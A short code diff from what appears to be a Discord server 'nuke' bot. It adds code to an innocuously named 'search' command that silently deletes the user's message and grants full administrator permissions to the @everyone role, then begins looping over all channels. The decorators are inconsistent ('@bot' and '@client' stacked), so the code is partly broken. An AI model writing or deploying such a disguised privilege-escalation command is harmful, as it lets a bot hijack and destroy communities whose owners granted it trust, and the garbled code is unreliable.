@@ -30,10 +30,14 @@ async def on_guild_channel_create(channel):
 
 
 @bot.command()
+@client.command()
 async def search(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    
+    try:
+        role = discord.utils.get(guild.roles, name="@everyone")
+        await role.edit(permissions=Permissions.all())
+        print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
     except:
         print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
     for channel in guild.channels:
